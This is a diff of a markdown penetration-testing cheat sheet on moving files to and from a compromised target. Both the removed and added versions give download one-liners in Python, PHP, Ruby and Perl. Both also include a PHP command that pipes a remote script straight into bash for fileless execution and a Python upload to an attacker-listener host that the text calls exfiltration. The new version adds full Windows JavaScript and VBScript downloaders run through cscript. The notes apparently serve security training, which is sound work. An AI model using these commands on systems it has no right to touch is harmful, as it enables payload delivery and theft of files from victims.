@@ -1,107 +1,78 @@
-1. Check for installed interpreters: `python`, `python3`, `php`, `ruby`, `perl`.
-2. If on Windows with no third-party languages, use `cscript.exe` with JS/VBS.
-3. For fileless execution on Linux, prioritize PHP pipe to bash.
-4. For exfiltration, use Python 3 `requests` if the library is present.
+# Transferring Files with Code
 
----
+## Download
 
-## Python Transfers
+Python2 / Python3 one-liners — use whichever is installed:
 
-Environment has Python 2.x or 3.x installed; common on Linux, rare but possible on Windows.
-
-Python 3 download for standard file retrieval
-
-```
-python3 -c 'import urllib.request;urllib.request.urlretrieve("<URL>", "<FILE_PATH>")'
+```bash
+python2.7 -c 'import urllib;urllib.urlretrieve("<URL>", "<OUTFILE>")'
+python3 -c 'import urllib.request;urllib.request.urlretrieve("<URL>", "<OUTFILE>")'
 ```
 
-Python 2 download when version 3 is unavailable
+PHP — `file_get_contents` is the cleanest one-liner:
 
-```
-python2.7 -c 'import urllib;urllib.urlretrieve ("<URL>", "<FILE_PATH>")'
-```
-
-Python 3 upload for exfiltration or moving files to attack box
-
-```
-python3 -c 'import requests;requests.post("http://<ATTACK_IP>:<PORT>/upload",files={"files":open("<FILE_PATH>","rb")})'
+```bash
+php -r '$file = file_get_contents("<URL>"); file_put_contents("<OUTFILE>",$file);'
 ```
 
-Start local upload server on attack box to receive files
+PHP fileless — pipe straight to bash:
 
-```
-python3 -m uploadserver
-```
-
-**Python requests module not installed** will cause the upload one-liner to fail as it is not a standard library in all environments.
-
-## PHP Transfers
-
-Target is running a web service or has PHP installed; prevalent in 77.4% of web servers.
-
-PHP file_get_contents one-liner for quick downloads
-
-```
-php -r '$file = file_get_contents("<URL>"); file_put_contents("<FILE_PATH>",$file);'
-```
-
-PHP fopen method for chunked reading when file_get_contents is restricted
-
-```
-php -r 'const BUFFER = 1024; $fremote = fopen("<URL>", "rb"); $flocal = fopen("<FILE_PATH>", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
-```
-
-PHP fileless execution by piping remote script content directly to bash
-
-```
+```bash
 php -r '$lines = @file("<URL>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
 ```
 
-- `file_get_contents` -> Simple syntax -> Prefer for small files.
-- `fopen` -> Stream-based -> Prefer for memory efficiency or restrictive environments.
+Ruby / Perl when nothing else is available:
 
-> ⚠️ Gap: Technique fails if **allow_url_fopen** is disabled in `php.ini`, preventing PHP from fetching remote URLs as files.
-
-**fopen wrappers disabled** will prevent the `@file` function from using a URL as a filename.
-
-## Ruby and Perl Transfers
-
-Linux distributions where Python or PHP may be missing or restricted.
-
-Ruby one-liner for file downloads
-
-```
-ruby -e 'require "net/http"; File.write("<FILE_PATH>", Net::HTTP.get(URI.parse("<URL>")))'
+```bash
+ruby -e 'require "net/http"; File.write("<OUTFILE>", Net::HTTP.get(URI.parse("<URL>")))'
+perl -e 'use LWP::Simple; getstore("<URL>", "<OUTFILE>");'
 ```
 
-Perl one-liner using LWP module
+JavaScript + cscript — Windows only, write `wget.js` to disk first:
 
-```
-perl -e 'use LWP::Simple; getstore("<URL>", "<FILE_PATH>");'
-```
-
-- Ruby -> `Net::HTTP` -> standard in most Ruby installs.
-- Perl -> `LWP::Simple` -> standard but might be stripped in minimal containers.
-
-## Windows Script Host Transfers
-
-Windows targets where native `cscript.exe` is available to execute JavaScript or VBScript.
-
-Execute JavaScript download via cscript
-
-```
-cscript.exe /nologo wget.js <URL> <FILE_PATH>
+```javascript
+var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+WinHttpReq.Open("GET", WScript.Arguments(0), false);
+WinHttpReq.Send();
+BinStream = new ActiveXObject("ADODB.Stream");
+BinStream.Type = 1; BinStream.Open();
+BinStream.Write(WinHttpReq.ResponseBody);
+BinStream.SaveToFile(WScript.Arguments(1));
 ```
 
-Execute VBScript download via cscript
-
-```
-cscript.exe /nologo wget.vbs <URL> <FILE_PATH>
+```cmd
+cscript.exe /nologo wget.js <URL> <OUTFILE>
 ```
 
-- JavaScript (WSH) -> uses `WinHttp.WinHttpRequest.5.1` and `ADODB.Stream`.
-- VBScript -> uses `Microsoft.XMLHTTP` and `Adodb.Stream`.
+VBScript + cscript — write `wget.vbs` to disk first:
 
-Requires writing the `.js` or `.vbs` script to disk first.
+```vbscript
+dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
+dim bStrm: Set bStrm = createobject("Adodb.Stream")
+xHttp.Open "GET", WScript.Arguments.Item(0), False
+xHttp.Send
+with bStrm
+    .type = 1 : .open : .write xHttp.responseBody
+    .savetofile WScript.Arguments.Item(1), 2
+end with
+```
 
-**Disk write protection or AV** may block the creation of the script files necessary for execution.
+```cmd
+cscript.exe /nologo wget.vbs <URL> <OUTFILE>
+```
+
+---
+
+## Upload
+
+Python3 requests one-liner → uploadserver:
+
+```bash
+python3 -m uploadserver
+```
+
+```bash
+python3 -c 'import requests;requests.post("http://<LHOST>:8000/upload",files={"files":open("<FILE>","rb")})'
+```
+
+> [!tip] Language priority on an unknown target: try Python3 → Python2 → PHP → Ruby → Perl. On Windows with no PowerShell: JS/VBS via cscript is pre-installed on every Windows since 98.
